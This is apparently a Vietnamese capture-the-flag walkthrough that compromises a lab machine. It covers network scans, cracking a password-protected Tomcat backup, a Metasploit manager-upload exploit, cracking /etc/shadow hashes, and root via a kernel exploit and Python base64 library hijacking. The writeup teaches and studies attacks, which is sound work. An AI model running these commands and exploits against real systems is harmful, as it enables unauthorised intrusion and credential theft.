# Tool

## Network Scanning
- discover
- nmap

## Enumeration
- dirb
- fcrackzip

## Exploitation
- metasploit
- john

## Privilege Escalation
- ssh
- python library hijacking
- root flag

## Level: Medium

# Network Scanning
Để bắt đầu, chúng ta phải sử dụng lệnh `netdiscover` để quét mạng để tìm địa chỉ IP của máy mục tiêu.
    
    netdiscover

![image](https://github.com/user-attachments/assets/2a9999d5-78ab-4868-805e-8a2a58c40414)

` Mục tiêu: 192.168.176.103`

Tiếp theo sử dụng công cụ `nmap` để quét mục tiêu để khám phá các dịch vụ, phiên phản dịch vụ và hệ điều hành được sử dụng trên mục tiêu.

    sudo nmap -sC -sV -O  192.168.176.103
( tùy chọn -sC: chạy các script mặc định của Nmap để thu thập thêm thông tin về các dịch vụ đang chạy trên máy mục tiêu, -sV: phát hiện phiên bản của các dịch vụ đang chạy trên các cổng mở,
-O: phát hiện hệ điều hành (OS fingerprinting) của máy mục tiêu).

![image](https://github.com/user-attachments/assets/388f9cbb-df53-462e-bbc1-963bc18675e1)

Theo kết quả hiện có 3 cổng đang được mở:
- Cổng 22 dịch vụ SSH.
- Cổng 80 dịch vụ HTTP ( Apache/2.4.41).
- Trên cổng 8080, Apache Tomcat 9.0.53 đang chạy.

# Enumeration

Khám phá trang máy chủ Apache `192.168.176.103:80`

Sử dụng công cụ `dirb` để liệt kê các liên kết, thư mục của trang web

    dirb http://192.168.176.103:80  

![image](https://github.com/user-attachments/assets/1a2a7979-1fe3-4ec4-a290-06acbdd4fc03)

Truy cập liên kết tìm thấy, không có gì lạ, nó chỉ là một trang máy chủ Apache.

![image](https://github.com/user-attachments/assets/2bfb8ec2-2de3-4efb-8a6c-4f9a4149b290)

Nâng cấp hơn vẫn sử dụng `brute foces` với công cụ `dirb` nhưng thêm các các extensions để mong tìm được thông tin hữu ích hơn:


    dirb http://192.168.176.103:80  -X .zip,.php,txt

![image](https://github.com/user-attachments/assets/56f55315-f929-4455-a859-7fea1ede72b4)

Không có thông tin gì thêm cả.

Thử mục tiêu tiếp theo Apache Tomcat. Các câu lệnh:

     dirb http://192.168.176.103:8080
     dirb http://192.168.176.103:8080 -X .zip,.txt,.php

![image](https://github.com/user-attachments/assets/91e85a94-b3ab-4ecc-8a21-1d9b7591c8a4)

![image](https://github.com/user-attachments/assets/0808ece1-d3f2-456f-ac3b-a0f0dff9ecb9)

Khá may mắn, đã tìm được liên kết có vẻ hữu ích: `http://192.168.176.103:8080/backup.zip`

Tải về và giải nén nó xem có thông tin gì không?

![image](https://github.com/user-attachments/assets/241763e2-6fa2-4372-8c4f-a838b38fb866)

File yêu cầu password, tiến hành bẻ khóa file zip này.

    zip2john backup.zip > zip_hash.txt         
    john -w=/usr/share/wordlists/rockyou.txt zip_hash.txt

![image](https://github.com/user-attachments/assets/98658c34-adb2-4e85-980c-ddcd765bc2db)

`password: @administrator_hi5 `

Hoặc đơn giản hơn chúng ta có thể sử dụng công cụ fcrackzip:

![image](https://github.com/user-attachments/assets/09afe1ae-d820-4e2e-8ba3-cdda69d6e64a)

Giải nén tệp tin với mật khẩu đã tìm được:

![image](https://github.com/user-attachments/assets/962c61fb-b380-461a-8b3f-c85c45e66596)

Chú ý đến tệp liên quan đến `user` tôi mở chúng.

    cat tomcat-users.xml 

![image](https://github.com/user-attachments/assets/a2af702f-b4ec-4b10-8c2d-4c60dedeb116)

# Exploitation

Vì trước đó tìm được thông tin xác thực hợp lệ (username và password) cho trang quản lý của Tomcat `admin/melehifokivai` nên ta tiến hành exploit sử dụng metasploit module exploit/multi/http/tomcat_mgr_upload:

    use exploit/multi/http/tomcat_mgr_upload
    set RHOSTS 192.168.176.103
    set RPORT 8080
    set HttpUsername admin
    set HttpPassword melehifokivai

![image](https://github.com/user-attachments/assets/91429076-ecac-47af-a844-5223a57de154)

Khai thác thành công. Tạo được session tới mục tiêu. Tạo shell đến OS đến thực hiện bước khác thác tiếp theo:

![image](https://github.com/user-attachments/assets/6e909d3c-4909-4174-8758-a0029a01b865)

Tạo shell thành công, nhưng trước tiên cần ổn định nó đã:

    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm

![image](https://github.com/user-attachments/assets/96e054a7-73f2-449e-94fd-b5e0e81d73b6)


Thử đăng nhập với tư cách user: tomcat nhưng thất bại. 

![image](https://github.com/user-attachments/assets/4f383cca-01fa-4438-a52b-4f4954e20140)

Tìm các user khác tại `/home`. Phát hiện thêm `randy` và `jaye`

![image](https://github.com/user-attachments/assets/42e4f309-44f3-4f25-b248-f06fa45c77e7)

![image](https://github.com/user-attachments/assets/de7be083-5f9a-4667-bf21-0b0fa795a953)

Thành công đăng nhập với tư cách `jaye`.

Sử dụng tài khoản user `jaye` tìm được ở trên tiến hành leo thang đặc quyền theo cách khác:

![image](https://github.com/user-attachments/assets/85e7d0ed-2f19-4c87-a5a2-98573ad1b184)

Thử liền kê quyền hạn thực thi của user jaye, điều này không mang lại kết quả:

![image](https://github.com/user-attachments/assets/705e86d5-b7ce-4099-bb93-0aa6cfcb077a)

Thực hiện câu lệnh `ls -la` để xem chi tiết tất cả tệp tin:

![image](https://github.com/user-attachments/assets/02e31a5f-dc2b-4e8b-a575-970f5f8887a2)

Phát hiện thư mục `Files ` thuộc sở hữu và thực thi bởi root, điêu hướng tới thư mục:

![image](https://github.com/user-attachments/assets/387b36a9-c5eb-4ca2-8f3f-bb9e1849d463)

Thực thi `look` ta có thể đọc được file `/etc/shadow` chứa tài khoản của user như root.

Giải mã các `hash` này để tìm password của root, randy và tomcat, sử dụng công cụ `john`:

    john --wordlist=/usr/share/wordlists/rockyou.txt hash
Kết qủa chỉ tìm được mật khẩu của user `randy` -- `07051986randy`

![image](https://github.com/user-attachments/assets/8af6bd84-0044-431c-b1ee-b61a351efaf8)


# Privilege Escalation

Có 4 cách để thực hiện leo thang đặc quyền:
- Thông qua File Permission: Leo thang đặc quyền thông qua việc cấu hình sai về quyền SUID của files.
  - B1: Tìm kiếm các file có quyền SUID
  
        find / -type f -perm +4000 -ls 2>/dev/null
  - B2: Lựa chọn file để tận dụng leo quyền
  - B3: Thực hiện khai thác
- Thông qua Scheduled Task: Leo thang đặc quyền thông qua việc cấu hình sai về quyền SUID của files.
  - B1: Tìm kiếm các scheduled task: Trong linux, ta có thể quan sát các cron jobs thông qua file cấu hình /etc/crontab
  - B2: Lựa chọn cronjob
  - B3: Thực hiện leo quyền
- Thông qua Kernel Exploit
  - B1: Thu thập thông tin về kernel: `uname -a` hoặc `cat /proc/version` để lấy version của hệ thống
  - B2: Tìm kiếm public exploit
  - B3: Thực hiện leo quyền
- Giới hạn của người dùng: dựa vào config của Sudoers file, từ việc chỉ có thể thực thi sudo với những lệnh hạn chế, có thể leo thang đặc quyền để có được quyền Root.
  - B1: Liệt kê quyền hạn: `sudo -l`
  - B2: Lựa chọn quyền hạn thực thi để tận dụng leo quyền
  - B3: Leo quyền


- Thông qua Kernel Exploit: `uname -a`

![image](https://github.com/user-attachments/assets/fda822bf-c3e0-443c-bcef-98b3c5c1eb69)

Xác định được phiên bản kernel `5.11.0-34-generic`. Sử dụng `searchsploit` để tìm cách khai thác nhưng không có:

![image](https://github.com/user-attachments/assets/69258983-1fa7-4744-acfc-da62e81a6250)

Tìm kiếm có được thông tin liên quan về 5.11.0-34-generic, đó là lỗ hỏng bảo mật `CVE-2022-0847`:

![image](https://github.com/user-attachments/assets/c9667a3c-2708-440e-a8fd-96db3462ba3b)

Tải và biên dịch tệp thực thi để tiến hành exploit:

Trước khi exploit:

![image](https://github.com/user-attachments/assets/da61c303-a8bc-4837-b09b-5d6ee4ce2d08)

Tìm các file SUID sử dụng câu lệnh: `find / -perm -u=s -type f 2>/dev/null`

![image](https://github.com/user-attachments/assets/393726ef-f18f-4955-b49f-5b7e2503ba5c)

Thực thi tệp khai thác với bất kì SUID nào ta thu được kết quả:

![image](https://github.com/user-attachments/assets/39078620-5927-46d7-9b08-453e2afda78e)


- Leo thang đặc quyền bằng cách kiểm tra giới hạn của người dùng `sudo -l`:

Sử dụng `ssh` để loggin tài khoản user randy` và tiến hành khai thác:

![image](https://github.com/user-attachments/assets/bb7b5de1-027c-4faf-b404-646d4d1c63cb)

![image](https://github.com/user-attachments/assets/e66ff7bb-a090-4a3d-b04f-944e0e055d7f)

`/home/randy/randombase64.py` có thể bị khai thác để nâng cao đặc quyền:

![image](https://github.com/user-attachments/assets/0736cb12-a692-495d-91b6-bb2209c289f4)

Để có được vị trí tệp base64, tôi sử dụng lệnh `locate`. Trong vài giây, tôi phát hiện ra tọa độ của nó. Tôi đã điều tra các hạn chế của tệp. Sử dụng tập tin này, chúng ta có thể có quyền truy cập root.

    locate base64
    ls -la /usr/lib/python3.8/base64.py

![image](https://github.com/user-attachments/assets/1b4fa2e3-3371-4e66-bd24-2625ee95e984)

Tôi đã thực hiện một số thay đổi đối với tệp python base64 này bằng lệnh `nano`. Thêm mã này để có quyền truy cập root vào máy của nạn nhân.

    import os
    os.system ("/bin/bash")


















  
 












    






